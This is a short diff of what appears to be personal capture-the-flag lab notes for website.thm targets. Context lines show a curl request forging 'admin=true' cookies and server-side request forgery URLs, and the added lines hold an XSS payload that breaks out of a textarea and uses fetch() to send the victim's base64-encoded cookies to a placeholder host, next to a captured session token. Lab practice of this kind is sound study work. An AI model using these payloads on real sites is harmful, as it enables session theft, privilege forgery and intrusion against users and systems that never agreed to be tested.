@@ -25,4 +25,6 @@ curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
 http://website.thm/stock?server=api&id=qwe
 http://website.thm/stock?server=api.website.thm/api/user&x&id=123
 
+#XSS
+</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
 session=9392c12a40773afcedfd7f2ee0f3de3f
